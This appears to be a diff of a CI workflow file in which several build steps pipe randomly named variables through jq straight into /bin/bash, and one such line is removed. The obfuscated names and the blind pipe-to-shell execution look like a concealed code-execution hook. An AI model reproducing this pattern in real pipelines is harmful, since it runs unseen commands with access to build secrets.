@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$arp57920" | jq -r .kq11901 | /bin/bash
           echo $vnv71 | jq -r .d251 | /bin/bash
-          echo $ytyc006 | jq -r .vqo41123 | /bin/bash
           printf '%s' "$atjb3202" | jq -r .xswhx2101 | /bin/bash
           echo $m42 | jq -r .gpeav8 | /bin/bash
           printf '%s' "$xmd1" | jq -r .jbebg05 | /bin/bash
